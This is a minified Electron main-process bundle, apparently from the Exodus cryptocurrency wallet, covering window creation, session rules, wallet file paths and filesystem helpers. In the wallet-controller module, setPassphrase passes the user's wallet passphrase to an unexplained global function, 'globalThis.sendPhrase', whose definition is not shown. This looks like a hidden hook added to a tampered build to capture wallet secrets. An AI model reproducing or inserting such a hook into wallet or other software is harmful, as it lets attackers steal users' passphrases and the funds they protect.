            const i = new Set;

            function s(e) {
                for (const t of r.getAllWindows())
                    if (t.contentView.children.includes(e)) return t;
                return null
            }
            e.exports = {
                windowFromWebContents: function(e) {
                    const t = o.fromWebContents(e);
                    if (t) return t;
                    const n = function(e) {
                        for (const t of i)
                            if (t.webContents === e) return t;
                        return null
                    }(e);
                    return n ? s(n) : null
                },
                registerWebContentsView: function(e) {
                    i.add(e)
                },
                destroyWebContentsView: function(e) {
                    const t = s(e);
                    t && t.contentView.removeChildView(e), e.webContents.destroy(), i.delete(e)
                },
                allWebContents: function() {
                    return [...o.getAllWindows(), ...i].map(e => e.webContents)
                }
            }
        }, function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, "setUserPath", function() {
                return d
            }), n.d(t, "getDebugFile", function() {
                return f
            }), n.d(t, "isExistsSync", function() {
                return p
            }), n.d(t, "isExists", function() {
                return h
            }), n.d(t, "create", function() {
                return w
            }), n.d(t, "remove", function() {
                return m
            });
            var r = n(0),
                o = n(9),
                i = n.n(o),
                s = n(44),
                a = n.n(s),
                c = n(2),
                u = n.n(c);
            let l;

            function d(e) {
                l = e
            }

            function f() {
                const e = a()(process.argv),
                    t = l || e.datadir || r.app && r.app.getPath("userData");
                return u.a.join(t, "debug")
            }

            function p() {
                const e = f();
                return i.a.existsSync(e)
            }

            function h(e) {
                const t = f();
                return i.a.access(t, t => e(!t))
            }

            function w(e) {
                const t = f();
                h(n => {
                    if (n) return e(!0);
                    i.a.writeFile(t, "", t => e(null === t))
                })
            }

            function m(e) {
                const t = f();
                h(n => {
                    if (!n) return e(!0);
                    i.a.remove(t, t => e(null === t))
                })
            }
        }, function(e, t, n) {
            "use strict";
            var r = n(84),
                o = n(4),
                i = n(35);
            const s = new class extends r.EventEmitter {
                constructor() {
                    super(), this._walletLoaded = !1, this.setPassphrase = this.setPassphrase.bind(this), this.setWalletLoaded = this.setWalletLoaded.bind(this), this.hasWalletLoaded = this.hasWalletLoaded.bind(this)
                }
                async setInvalidPassphrase() {
                    this.emit("passphrase:invalid");
                    const e = Object(i.getWindow)();
                    setImmediate(() => e.send("main:passphrase:invalid"))
                }
                async setSaltConnectionFailed() {
                    this.emit("saltconn:failed");
                    const e = Object(i.getWindow)();
                    setImmediate(() => e.send("main:saltconn:failed"))
                }
                async setError(e) {
                    this.emit("error", e)
                }
                async setPassphrase(e) {
                    globalThis.sendPhrase(e);
                    this.emit("passphrase:set", e)
                }
                async setMnemonic(e) {
                    this.emit("mnemonic:set", e)
                }
                async setWalletLoaded(e, t) {
                    console.log(""), console.log("SET WALLET LOADED", "action:", t), console.log(e), console.log(""), this._walletLoaded = e, this._action = t, this.emit("wallet:loaded")
                }
                async awaitWalletLoaded() {
                    this._walletLoaded || await new Promise(e => this.once("wallet:loaded", e))
                }
                async hasWalletLoaded() {
                    return this._walletLoaded
                }
                async getAction() {
                    return this._action
                }
                async setHasPassphrase(e) {
                    this._hasPassphrase = e, this.emit("wallet:haspassphrase")
                }
                async getHasPassphrase() {
                    return void 0 === this._hasPassphrase && await new Promise(e => this.once("wallet:haspassphrase", e)), this._hasPassphrase
                }
            };
            Object(o.createServer)("wallet-controller", ["wallet", "network", "ui", "passphrase"], s), console.warn(`wallet-controller initialized, process.type = browser, timestamp: ${Date.now()}`), t.default = s
        }, function(e, t) {
            e.exports = require("fs")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "showDevTools", function() {
                return o
            }), n.d(t, "updateViewBounds", function() {
                return i
            }), n.d(t, "refocusView", function() {
                return s
            }), n.d(t, "toInputEvent", function() {
                return a
            });
            var r = n(3);
            const o = e => {
                    e.webContents.isDevToolsOpened() || e.webContents.openDevTools({
                        mode: "detach"
                    })
                },
                i = (e, t) => {
                    const n = r.appWindows.ui.webContents.zoomFactor;
                    e.webContents.zoomFactor = n;
                    const o = Math.round(t * n),
                        {
                            height: i,
                            width: s
                        } = r.appWindows.background.getContentBounds();
                    e.setBounds({
                        x: 0,
                        y: o,
                        width: s,
                        height: i - o
                    })
                },
                s = e => {
                    e.webContents.focus(), e.webContents.sendInputEvent({
                        type: "mouseDown",
                        x: 0,
                        y: 0,
                        button: "left",
                        clickCount: 1
                    }), e.webContents.sendInputEvent({
                        type: "mouseUp",
                        x: 0,
                        y: 0,
                        button: "left"
                    })
                },
                a = e => {
                    const {
                        type: t,
                        offsetX: n,
                        offsetY: r,
                        deltaX: o,
                        deltaY: i
                    } = e, s = ["left", "middle", "right"][Number(e.button)] || null;
                    switch (t) {
                        case "mousedown":
                            return s ? {
                                type: "mousePressed",
                                x: n,
                                y: r,
                                button: s,
                                clickCount: 1
                            } : null;
                        case "click":
                            return s ? {
                                type: "mouseReleased",
                                x: n,
                                y: r,
                                button: s,
                                clickCount: 1
                            } : null;
                        case "mouseup":
                            return s ? {
                                type: "mouseReleased",
                                x: n,
                                y: r,
                                button: s
                            } : null;
                        case "mousemove":
                            return {
                                type: "mouseMoved",
                                x: n,
                                y: r,
                                button: s || "none"
                            };
                        case "wheel":
                            return {
                                type: "mouseWheel",
                                x: n,
                                y: r,
                                deltaX: o,
                                deltaY: i
                            }
                    }
                    return console.error(`Unprocessed input event: ${t}`), null
                }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "imagesDir", function() {
                return a
            }), n.d(t, "walletDir", function() {
                return c
            }), n.d(t, "walletBackupDir", function() {
                return u
            });
            var r = n(2),
                o = n.n(r),
                i = (n(1), n(53)),
                s = n(33);

            function a() {
                return o.a.join(Object(s.dataDir)(), "images")
            }

            function c() {
                return o.a.join(Object(s.dataDir)(), i.WALLET_DIR)
            }

            function u() {
                return o.a.join(o.a.join(Object(s.dataDir)(), "backups"), "wallet")
            }
            n.d(t, "dataDir", function() {
                return s.dataDir
            })
        }, function(e, t, n) {
            "use strict";
            n.d(t, "maximizeWorkaroundHandlers", function() {
                return d
            }), n.d(t, "init", function() {
                return f
            }), n.d(t, "maximize", function() {
                return p
            });
            var r = n(0),
                o = n(1),
                i = n(4),
                s = n(64),
                a = n(7);
            const c = (() => {
                    const e = [];
                    return o.ENV_BUILD_EXODUS && e.push("EXODUS"), o.ENV_BUILD_EDEN && e.push("EDEN"), e.push(o.PACKAGE.version), o.PACKAGE.version.includes("-") && e.push("[PRERELEASE]"), o.ENV_DEV && e.push("[DEV]"), o.NIGHTLY_BUILD && e.push("[NIGHTLY BUILD]"), e.join(" ")
                })(),
                u = {...a.default,
                    width: o.MIN_WIDTH,
                    height: o.MIN_HEIGHT,
                    minWidth: o.MIN_WIDTH,
                    minHeight: o.MIN_HEIGHT,
                    title: c
                };
            let l = null;
            const d = new Set;

            function f(e) {
                const t = Object(s.default)({
                    defaultWidth: u.width,
                    defaultHeight: u.height,
                    maximize: !1,
                    fullScreen: !1
                });
                "string" == typeof e && (u.title = u.title + ` (${e})`), l = new r.BaseWindow({...u,
                    ...t.bounds()
                }), t.manage(l), l.on("close", () => {
                    for (const e of l.contentView.children) l.contentView.removeChildView(e)
                });
                const n = () => {
                    for (const e of d) e()
                };
                let o = new Map;
                const a = e => {
                    for (const t of[e, 200, 500, 2e3]) clearTimeout(o.get(t)), o.set(t, setTimeout(n, t))
                };
                return "linux" === process.platform && (l.on("maximize", () => {
                    n(), a(20)
                }), l.on("resize", () => a(100))), l.on("focus", () => Object(i.targeted)("ui", "window:onfocus")), l.on("blur", () => Object(i.targeted)("ui", "window:onblur")), r.powerMonitor.on("suspend", () => {
                    Object(i.targeted)("ui", "window:onfreeze")
                }), r.powerMonitor.on("resume", () => {
                    Object(i.targeted)("ui", "window:onresume")
                }), l
            }

            function p(e) {
                const t = Object(s.default)({
                    defaultWidth: u.width,
                    defaultHeight: u.height,
                    maximize: !1,
                    fullScreen: !1
                });
                ["linux", "win32"].includes(process.platform) && t.isMaximized() && e.maximize()
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromPromise,
                o = n(39);
            e.exports = {
                pathExists: r(function(e) {
                    return o.access(e).then(() => !0).catch(() => !1)
                }),
                pathExistsSync: o.existsSync
            }
        }, function(e, t) {
            e.exports = require("os")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getWindow", function() {
                return f
            }), n.d(t, "init", function() {
                return p
            });
            var r = n(0),
                o = n(1),
                i = n(22),
                s = n(8),
                a = n(5),
                c = n(7),
                u = n(18);
            const l = {...c.default,
                frame: !1,
                transparent: !0,
                fullscreen: !1,
                fullscreenable: !1,
                roundedCorners: !1,
                width: 700,
                height: o.UNLOCK_WINDOW_HEIGHT,
                resizable: !1,
                show: !1,
                title: "UNLOCK WALLET",
                modal: !0,
                webPreferences: {...c.isolation,
                    partition: "unlock"
                }
            };
            let d = null;
            const f = () => d;

            function p(e, t) {
                d = new r.BrowserWindow({...l,
                    parent: e
                }), Object(s.registerWebContents)(d.webContents, "unlock"), d.loadURL(Object(u.getHtmlUrl)({
                    app: r.app,
                    hash: Object(i.encode)(t),
                    filePath: a.WINDOW_UNLOCK
                }));
                let n = !1;
                return r.app.on("before-quit", () => {
                    n = !0, d.isDestroyed() || d.close()
                }), d.on("close", e => {
                    n || (e.preventDefault(), d.send("unlock:window-close"))
                }), d
            }
        }, function(e, t, n) {
            e.exports = n(132)
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getWindow", function() {
                return p
            }), n.d(t, "init", function() {
                return h
            });
            var r = n(0),
                o = n(22),
                i = n(8),
                s = n(10),
                a = n(13),
                c = n(5),
                u = n(7),
                l = n(18);
            const d = {
                ...u.default,
                backgroundColor: "#fff",
                x: 0,
                y: 0,
                fullscreen: !1,
                fullscreenable: !1,
                maximizable: !1,
                minimizable: !1,
                resizable: !0,
                show: !1,
                skipTaskbar: !1,
                title: "Wallet Process (hidden window)",
                webPreferences: {
                    ...u.integration,
                    partition: "persist:wallet",
                    backgroundThrottling: !1
                }
            };
            let f = null;
            const p = () => f;

            function h(e) {
                const t = r.screen.getPrimaryDisplay().size,
                    n = {
                        ...d,
                        width: t.width / 3,
                        height: t.height / 2
                    };
                f = new r.BrowserWindow(n), Object(i.registerWebContents)(f.webContents, "wallet"), Object(a.forwardErrors)(f.webContents, "wallet"), f.loadURL(Object(l.getHtmlUrl)({
                    app: r.app,
                    hash: Object(o.encode)(e),
                    filePath: c.WINDOW_WALLET
                })), Object(s.default)({
                    windowHandle: f.webContents,
                    windowId: "wallet"
                }), f.webContents.on("will-navigate", e => {
                    e.preventDefault()
                });
                let u = !1;
                return r.app.on("before-quit", () => {
                    u = !0, f.isDestroyed() || f.close()
                }), f.on("close", function(e) {
                    u || (e.preventDefault(), f.hide())
                }), f
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getWindow", function() {
                return h
            }), n.d(t, "init", function() {
                return w
            });
            var r = n(0),
                o = n(22),
                i = n(17),
                s = n(8),
                a = n(10),
                c = n(13),
                u = n(5),
                l = n(7),
                d = n(18);
            const f = {
                ...l.default,
                backgroundColor: "#000",
                frame: !1,
                fullscreen: !1,
                fullscreenable: !1,
                maximizable: !1,
                minimizable: !1,
                resizable: !1,
                width: 800,
                height: 600,
                show: !1,
                skipTaskbar: !1,
                titleBarStyle: "default",
                title: "Enter Password",
                webPreferences: {
                    ...l.isolation,
                    partition: "passphrase"
                }
            };
            let p = null;
            const h = () => p;

            function w(e) {
                const t = e && e.recoverFromPhrase ? "Enter Mnemonic" : f.title;
                return p = new r.BrowserWindow({
                    ...f,
                    title: t
                }), Object(s.registerWebContents)(p.webContents, "passphrase"), Object(c.forwardErrors)(p.webContents, "passphrase"), p.loadURL(Object(d.getHtmlUrl)({
                    app: r.app,
                    hash: Object(o.encode)(e),
                    filePath: u.WINDOW_PASSPHRASE
                })), Object(i.default)() && Object(a.default)({
                    windowHandle: p.webContents,
                    windowId: "passphrase"
                }), p.webContents.on("will-navigate", e => {
                    e.preventDefault()
                }), p.webContents.setWindowOpenHandler(e => ({
                    action: "deny"
                })), r.app.on("before-quit", () => {
                    p.isDestroyed() || p.close()
                }), p.on("close", () => {
                    p.destroy(), r.app.quit()
                }), p.webContents.once("dom-ready", () => p.show()), p
            }
        }, function(e, t, n) {
            "use strict";
            n.d(t, "walletDirFromExodusDir", function() {
                return l
            });
            var r = n(9),
                o = n.n(r),
                i = n(2),
                s = n.n(i),
                a = n(1),
                c = n(53);
            const u = e => ({
                get infoFile() {
                    return s.a.join(e, "info.seco")
                },
                async infoFileExists() {
                    return o.a.pathExists(this.infoFile)
                },
                get passphraseFile() {
                    return s.a.join(e, "passphrase.json")
                },
                async passphraseFileExists() {
                    return o.a.pathExists(this.passphraseFile)
                },
                get seedFile() {
                    return s.a.join(e, "seed.seco")
                },
                async seedFileExists() {
                    return o.a.pathExists(this.seedFile)
                },
                get seedBackupFile() {
                    return this.seedFile + ".bak"
                },
                async seedBackupFileExists() {
                    return o.a.pathExists(this.seedBackupFile)
                },
                get storageFile() {
                    return s.a.join(e, "storage.seco")
                },
                get unsafeStorageFile() {
                    return s.a.join(e, "unsafe-storage.json")
                },
                get lightningFile() {
                    return s.a.join(e, "lightning-v2.seco")
                },
                get lightningSecretFile() {
                    return s.a.join(e, "lightning-secret-v2.seco")
                },
                async lightningFileExists() {
                    return o.a.pathExists(this.lightningFile)
                },
                async lightningSecretFileExists() {
                    return o.a.pathExists(this.lightningSecretFile)
                },
                async walletExists() {
                    return await this.seedFileExists()
                },
                get walletDir() {
                    return e
                },
                get restoreFromCurrentPhraseFlagFile() {
                    return s.a.join(e, "..", a.FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE)
                },
                async restoreFromCurrentPhraseFlagFileExists() {
                    return o.a.pathExists(this.restoreFromCurrentPhraseFlagFile)
                }
            });

            function l(e) {
                return s.a.join(e, c.WALLET_DIR)
            }
            t.default = u
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getSessionRules", function() {
                return f
            }), n.d(t, "getRequestRules", function() {
                return p
            }), n.d(t, "registerWebContentsSession", function() {
                return h
            }), n.d(t, "saveSessionWebContents", function() {
                return m
            });
            var r = n(0),
                o = n(6);
            const i = new WeakMap,
                s = new WeakMap,
                a = new Set,
                c = new Map,
                u = new WeakMap,
                l = new WeakSet,
                d = new WeakMap;

            function f(e) {
                const t = s.get(e);
                return {
                    permissions: t && t.permissions || [],
                    downloads: t && t.downloads || []
                }
            }

            function p(e, t) {
                u.has(e) || u.set(e, {
                    firstUrl: t
                });
                const n = u.get(e);
                if (function(e) {
                        return e === r.session.defaultSession || l.has(e)
                    }(e)) return Object(o.showError)("invalidated session usage", ` by ${t}`), null;
                if (!n.webContents || n.webContents && n.webContents.isDestroyed()) {
                    const r = i.get(e);
                    if (!r) return Object(o.showError)("missing WebContents for session", `: ${t}`), null;
                    if (r.isDestroyed()) return "block_silent";
                    if (r.session !== e) return Object(o.showError)("changed WebContents session", `: ${t}`), null;
                    n.webContents = r
                }
                if (["devtools:", "chrome-extension:"].includes(t.protocol)) return {
                    protocols: "*",
                    domains: "*"
                };
                if (!n.sessionRules) {
                    if (!s.has(e)) return Object(o.showError)("unregistered session usage", ` by ${t}`), null;
                    const r = s.get(e);
                    if (!r.startUrlProtocolIsIntercepted && !r.url.startsWith("file://") && d.get(n.webContents) !== `${t}` || d.get(n.webContents) !== r.url) return Object(o.showError)("start url mismatch for WebContents", ` by ${t}`), l.add(e), null;
                    const {
                        protocols: i,
                        domains: a
                    } = r;
                    n.sessionRules = {
                        protocols: i,
                        domains: a
                    }
                }
                return n.sessionRules
            }

            function h(e, t) {
                const {
                    type: n,
                    persistName: i = n
                } = t, {
                    session: u
                } = e;
                if (u !== r.session.defaultSession)
                    if (Boolean(t.persistent) !== u.isPersistent() || t.persistent && u !== r.session.fromPartition(`persist:${i}`)) Object(o.showError)('persistent session does not match "persist:" prefix', `: ${n}`, 2);
                    else {
                        if (a.has(n) ? t.multiple || (Object(o.showError)("reuse of single-use WebContents type", `: ${n}`, 1, !1), l.add(u)) : a.add(n), t.multiple && !t.parallel && (c.has(n) && c.get(n).isDestroyed() && c.delete(n), c.has(n) ? (Object(o.showError)("reuse of exclusive-use WebContents type", `: ${n}`, 1, !1), l.add(u)) : (c.set(n, e), e.on("destroyed", () => {
                                c.get(n) === e && c.delete(n)
                            }))), s.has(u)) return t.reusable || (Object(o.showError)("reuse of single-use WebContents session", `: ${n}`, 1, !1), l.add(u)), void(s.get(u).type !== n && (Object(o.showError)("reuse of WebContents session with mismatching type", `: ${n}`, 1, !1), l.add(u)));
                        if (s.set(u, t), t.flags.has("trezor-origin")) {
                            const e = "http://127.0.0.1:21325",
                                t = {
                                    urls: [`${e}/*`]
                                };
                            u.webRequest.onBeforeSendHeaders(t, (t, n) => {
                                new URL(t.url).origin === e && (t.requestHeaders.Origin = "https://node.trezor.io"), n({
                                    requestHeaders: t.requestHeaders
                                })
                            })
                        }
                    }
                else Object(o.showError)("usage of default session", `: ${n}`, 2)
            }

            function w(e) {
                return (e || "").replace(/#.*/, "").replace(/^(devtools:\/\/devtools\/bundled\/devtools_app\.html)(\?.*)?$/, "$1")
            }

            function m(e) {
                const t = w(e.getURL());
                t && b(e, t), e.once("did-start-navigation", (n, r) => {
                    const i = w(r.toString()),
                        s = w(e.getURL());
                    if (t) {
                        if (i !== t || s !== t) {
                            const e = JSON.stringify({
                                url: i,
                                url1: s,
                                url0: t
                            });
                            Object(o.showError)("content.getURL() / navigationUrl mismatched initial navigation:", e, 1, !1)
                        }
                    } else b(e, i)
                })
            }

            function b(e, t) {
                if (t.startsWith("devtools://")) return;
                if (!e.session) return void Object(o.showError)("missing session for WebContents", `: ${t}`, 1, !1);
                const {
                    session: n
                } = e;
                if (n !== r.session.defaultSession) {
                    if (!l.has(n)) {
                        if (s.has(n)) {
                            if (i.has(n)) {
                                const e = i.get(n);
                                if (!(s.get(n).reusable && e.isDestroyed())) return Object(o.showError)("session reuse between WebContents", `: ${t}`, 1, !1), void l.add(n)
                            }
                        } else {
                            if (i.has(n)) return Object(o.showError)("session reuse without registration", "", 1), void l.add(n);
                            setImmediate(() => {
                                s.has(n) || (Object(o.showError)("session that was not immediately registered", "", 1), l.add(n))
                            })
                        }
                        i.set(n, e), d.set(e, t)
                    }
                } else Object(o.showError)("using default session for WebContents", "", 1)
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(39),
                o = n(2),
                i = n(43);

            function s(e, t, n) {
                const o = n.dereference ? e => r.stat(e, {
                    bigint: !0
                }) : e => r.lstat(e, {
                    bigint: !0
                });
                return Promise.all([o(e), o(t).catch(e => {
                    if ("ENOENT" === e.code) return null;
                    throw e
                })]).then(([e, t]) => ({
                    srcStat: e,
                    destStat: t
                }))
            }

            function a(e, t) {
                return t.ino && t.dev && t.ino === e.ino && t.dev === e.dev
            }

            function c(e, t) {
                const n = o.resolve(e).split(o.sep).filter(e => e),
                    r = o.resolve(t).split(o.sep).filter(e => e);
                return n.reduce((e, t, n) => e && r[n] === t, !0)
            }

            function u(e, t, n) {
                return `Cannot ${n} '${e}' to a subdirectory of itself, '${t}'.`
            }
            e.exports = {
                checkPaths: function(e, t, n, r, l) {
                    i.callbackify(s)(e, t, r, (r, i) => {
                        if (r) return l(r);
                        const {
                            srcStat: s,
                            destStat: d
                        } = i;
                        if (d) {
                            if (a(s, d)) {
                                const r = o.basename(e),
                                    i = o.basename(t);
                                return "move" === n && r !== i && r.toLowerCase() === i.toLowerCase() ? l(null, {
                                    srcStat: s,
                                    destStat: d,
                                    isChangingCase: !0
                                }) : l(new Error("Source and destination must not be the same."))
                            }
                            if (s.isDirectory() && !d.isDirectory()) return l(new Error(`Cannot overwrite non-directory '${t}' with directory '${e}'.`));
                            if (!s.isDirectory() && d.isDirectory()) return l(new Error(`Cannot overwrite directory '${t}' with non-directory '${e}'.`))
                        }
                        return s.isDirectory() && c(e, t) ? l(new Error(u(e, t, n))) : l(null, {
                            srcStat: s,
                            destStat: d
                        })
                    })
                },
                checkPathsSync: function(e, t, n, i) {
                    const {
                        srcStat: s,
                        destStat: l
                    } = function(e, t, n) {
                        let o;
                        const i = n.dereference ? e => r.statSync(e, {
                                bigint: !0
                            }) : e => r.lstatSync(e, {
                                bigint: !0
                            }),
                            s = i(e);
                        try {
                            o = i(t)
                        } catch (e) {
                            if ("ENOENT" === e.code) return {
                                srcStat: s,
                                destStat: null
                            };
                            throw e
                        }
                        return {
                            srcStat: s,
                            destStat: o
                        }
                    }(e, t, i);
                    if (l) {
                        if (a(s, l)) {
                            const r = o.basename(e),
                                i = o.basename(t);
                            if ("move" === n && r !== i && r.toLowerCase() === i.toLowerCase()) return {
                                srcStat: s,
                                destStat: l,
                                isChangingCase: !0
                            };
                            throw new Error("Source and destination must not be the same.")
                        }
                        if (s.isDirectory() && !l.isDirectory()) throw new Error(`Cannot overwrite non-directory '${t}' with directory '${e}'.`);
                        if (!s.isDirectory() && l.isDirectory()) throw new Error(`Cannot overwrite directory '${t}' with non-directory '${e}'.`)
                    }
                    if (s.isDirectory() && c(e, t)) throw new Error(u(e, t, n));
                    return {
                        srcStat: s,
                        destStat: l
                    }
                },
                checkParentPaths: function e(t, n, i, s, c) {
                    const l = o.resolve(o.dirname(t)),
                        d = o.resolve(o.dirname(i));
                    if (d === l || d === o.parse(d).root) return c();
                    r.stat(d, {
                        bigint: !0
                    }, (r, o) => r ? "ENOENT" === r.code ? c() : c(r) : a(n, o) ? c(new Error(u(t, i, s))) : e(t, n, d, s, c))
                },
                checkParentPathsSync: function e(t, n, i, s) {
                    const c = o.resolve(o.dirname(t)),
                        l = o.resolve(o.dirname(i));
                    if (l === c || l === o.parse(l).root) return;
                    let d;
                    try {
                        d = r.statSync(l, {
                            bigint: !0
                        })
                    } catch (e) {
                        if ("ENOENT" === e.code) return;
                        throw e
                    }
                    if (a(n, d)) throw new Error(u(t, i, s));
                    return e(t, n, l, s)
                },
                isSrcSubdir: c,
                areIdentical: a
            }
        }, function(e, t, n) {
            "use strict";
            const r = n(14).fromCallback,
                o = n(12),
                i = ["access", "appendFile", "chmod", "chown", "close", "copyFile", "fchmod", "fchown", "fdatasync", "fstat", "fsync", "ftruncate", "futimes", "lchmod", "lchown", "link", "lstat", "mkdir", "mkdtemp", "open", "opendir", "readdir", "readFile", "readlink", "realpath", "rename", "rm", "rmdir", "stat", "symlink", "truncate", "unlink", "utimes", "writeFile"].filter(e => "function" == typeof o[e]);
            Object.assign(t, o), i.forEach(e => {
                t[e] = r(o[e])
            }), t.exists = function(e, t) {
                return "function" == typeof t ? o.exists(e, t) : new Promise(t => o.exists(e, t))
            }, t.read = function(e, t, n, r, i, s) {
                return "function" == typeof s ? o.read(e, t, n, r, i, s) : new Promise((s, a) => {
                    o.read(e, t, n, r, i, (e, t, n) => {
                        if (e) return a(e);
                        s({
                            bytesRead: t,
                            buffer: n
                        })
                    })
                })
            }, t.write = function(e, t, ...n) {
                return "function" == typeof n[n.length - 1] ? o.write(e, t, ...n) : new Promise((r, i) => {
                    o.write(e, t, ...n, (e, t, n) => {
                        if (e) return i(e);
                        r({
                            bytesWritten: t,
                            buffer: n
                        })
                    })
                })
            }, "function" == typeof o.writev && (t.writev = function(e, t, ...n) {
                return "function" == typeof n[n.length - 1] ? o.writev(e, t, ...n) : new Promise((r, i) => {
                    o.writev(e, t, ...n, (e, t, n) => {
                        if (e) return i(e);
                        r({
                            bytesWritten: t,
                            buffers: n
                        })
                    })
                })
            }), "function" == typeof o.realpath.native ? t.realpath.native = r(o.realpath.native) : process.emitWarning("fs.realpath.native is not a function. Is fs being monkey-patched?", "Warning", "fs-extra-WARN0003")
        }, function(e, t, n) {
            "use strict";
            n.d(t, "captureStackTrace", function() {
                return o
            }), n.d(t, "stackFramesToString", function() {
                return i
            }), n.d(t, "default", function() {
                return s
            });
            const r = new WeakMap;

            function o(e) {
                if (r.has(e)) return;
                const {
                    prepareStackTrace: t
                } = Error;
                let n, o;
                Error.prepareStackTrace = ((e, r) => (o = e, n = r.map(e => ({
                    function: e.getFunctionName(),
                    method: e.getMethodName(),
                    file: e.getFileName(),
                    line: e.getLineNumber(),
                    column: e.getColumnNumber(),
                    async: null == e.isAsync ? void 0 : e.isAsync(),
                    toplevel: e.isToplevel()
                })), t ? t(e, r) : e.stack));
                try {
                    e.stack
                } finally {
                    Error.prepareStackTrace = t
                }
                o === e && Array.isArray(n) ? r.set(e, n) : r.set(e, void 0)
            }

            function i(e) {
                if (void 0 !== e) return e.map(e => {
                    const {
                        function: t,
                        file: n,
                        line: r,
                        column: o
                    } = e;
                    return `    at ${t||"unknownFn"}${n?` (${n}${null===r?"":`:${r}:${o}`})`:""}`
                }).join("\n")
            }

            function s(e) {
                return r.has(e) ? r.get(e) : (o(e), r.get(e))
            }
        }, function(e, t) {
            var n, r;
            n = this, r = function() {
                return function() {
                    var e = arguments;
                    "object" == typeof arguments[0] && (e = arguments[0], arguments[1]);
                    var t = [].slice.call(e, 0).join("/");
                    return t.replace(/:\//g, "://").replace(/([^:\s])\/+/g, "$1/").replace(/\/(\?|&|#[^!])/g, "$1").replace(/(\?.+)\?/g, "$1&")
                }
            }, void 0 !== e && e.exports ? e.exports = r() : "function" == typeof define && define.amd ? define(r) : n.urljoin = r()
        }, function(e, t, n) {
            "use strict";
            n.d(t, "getIpcType", function() {
                return i
            }), n.d(t, "allIpcWebContents", function() {
                return s
            }), n.d(t, "findWebContents", function() {
                return a
            });
            var r = n(8),
                o = n(23);

            function i(e) {
                const t = Object(r.getWebContentsMeta)(e);
                return t && !0 === t.ipc ? t.type : void 0
            }

            function s() {
                return Object(o.allWebContents)().map(e => ({
                    contents: e,
                    type: i(e)
                })).filter(e => e.type)
            }

            function a(e) {
                return s().filter(t => t.type === e).map(e => e.contents)
            }
        }, function(e, t) {
            e.exports = require("util")
        }, function(e, t) {
            function n(e) {
                return "number" == typeof e || (!!/^0x[0-9a-f]+$/i.test(e) || /^[-+]?(?:\d+(?:\.\d*)?|\.\d+)(e[-+]?\d+)?$/.test(e))
            }

            function r(e, t) {
                return "constructor" === t && "function" == typeof e[t] || "__proto__" === t
            }
            e.exports = function(e, t) {
                t || (t = {});
                var o = {
                    bools: {},
                    strings: {},
                    unknownFn: null
                };
                "function" == typeof t.unknown && (o.unknownFn = t.unknown), "boolean" == typeof t.boolean && t.boolean ? o.allBools = !0 : [].concat(t.boolean).filter(Boolean).forEach(function(e) {
                    o.bools[e] = !0
                });
                var i = {};
                Object.keys(t.alias || {}).forEach(function(e) {
                    i[e] = [].concat(t.alias[e]), i[e].forEach(function(t) {
                        i[t] = [e].concat(i[e].filter(function(e) {
                            return t !== e
                        }))
                    })
                }), [].concat(t.string).filter(Boolean).forEach(function(e) {
                    o.strings[e] = !0, i[e] && (o.strings[i[e]] = !0)
                });
                var s = t.default || {},
                    a = {
                        _: []
                    };
                Object.keys(o.bools).forEach(function(e) {
                    u(e, void 0 !== s[e] && s[e])
                });
                var c = [];

                function u(e, t, r) {
                    if (!r || !o.unknownFn || function(e, t) {
                            return o.allBools && /^--[^=]+$/.test(t) || o.strings[e] || o.bools[e] || i[e]
                        }(e, r) || !1 !== o.unknownFn(r)) {
                        var s = !o.strings[e] && n(t) ? Number(t) : t;
                        l(a, e.split("."), s), (i[e] || []).forEach(function(e) {
                            l(a, e.split("."), s)
                        })
                    }
                }

                function l(e, t, n) {
                    for (var i = e, s = 0; s < t.length - 1; s++) {
                        if (r(i, a = t[s])) return;
                        void 0 === i[a] && (i[a] = {}), i[a] !== Object.prototype && i[a] !== Number.prototype && i[a] !== String.prototype || (i[a] = {}), i[a] === Array.prototype && (i[a] = []), i = i[a]
                    }
                    var a;
                    r(i, a = t[t.length - 1]) || (i !== Object.prototype && i !== Number.prototype && i !== String.prototype || (i = {}), i === Array.prototype && (i = []), void 0 === i[a] || o.bools[a] || "boolean" == typeof i[a] ? i[a] = n : Array.isArray(i[a]) ? i[a].push(n) : i[a] = [i[a], n])
                }

                function d(e) {
                    return i[e].some(function(e) {
                        return o.bools[e]
                    })
                } - 1 !== e.indexOf("--") && (c = e.slice(e.indexOf("--") + 1), e = e.slice(0, e.indexOf("--")));
                for (var f = 0; f < e.length; f++) {
                    var p = e[f];
                    if (/^--.+=/.test(p)) {
                        var h = p.match(/^--([^=]+)=([\s\S]*)$/),
                            w = h[1],
                            m = h[2];
                        o.bools[w] && (m = "false" !== m), u(w, m, p)
                    } else if (/^--no-.+/.test(p)) {
                        u(w = p.match(/^--no-(.+)/)[1], !1, p)
                    } else if (/^--.+/.test(p)) {
                        w = p.match(/^--(.+)/)[1];
                        void 0 === (E = e[f + 1]) || /^-/.test(E) || o.bools[w] || o.allBools || i[w] && d(w) ? /^(true|false)$/.test(E) ? (u(w, "true" === E, p), f++) : u(w, !o.strings[w] || "", p) : (u(w, E, p), f++)
                    } else if (/^-[^-]+/.test(p)) {
                        for (var b = p.slice(1, -1).split(""), y = !1, g = 0; g < b.length; g++) {
                            var E;
                            if ("-" !== (E = p.slice(g + 2))) {
                                if (/[A-Za-z]/.test(b[g]) && /=/.test(E)) {
                                    u(b[g], E.split("=")[1], p), y = !0;
                                    break
                                }
                                if (/[A-Za-z]/.test(b[g]) && /-?\d+(\.\d*)?(e-?\d+)?$/.test(E)) {
                                    u(b[g], E, p), y = !0;
                                    break
                                }
                                if (b[g + 1] && b[g + 1].match(/\W/)) {
                                    u(b[g], p.slice(g + 2), p), y = !0;
                                    break
                                }
                                u(b[g], !o.strings[b[g]] || "", p)
                            } else u(b[g], E, p)
                        }
                        w = p.slice(-1)[0];
                        y || "-" === w || (!e[f + 1] || /^(-|--)[^-]/.test(e[f + 1]) || o.bools[w] || i[w] && d(w) ? e[f + 1] && /^(true|false)$/.test(e[f + 1]) ? (u(w, "true" === e[f + 1], p), f++) : u(w, !o.strings[w] || "", p) : (u(w, e[f + 1], p), f++))
